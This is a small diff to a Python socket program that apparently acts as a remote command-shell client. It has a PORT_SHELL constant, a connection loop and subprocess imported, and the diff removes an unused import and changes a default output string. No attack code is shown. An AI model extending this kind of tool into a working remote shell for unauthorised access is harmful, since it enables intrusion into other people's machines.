@@ -2,7 +2,6 @@ import socket
 import time
 import os
 import subprocess
-import cython
 
 HEADER = 64
 PORT_SHELL = 887
@@ -125,7 +124,7 @@ def main():
         server_conn.settimeout(5)
         while True:
             command = ""
-            output = ""
+            output = "no output"
             if not is_still_connected(server_conn):
                 break
             try:
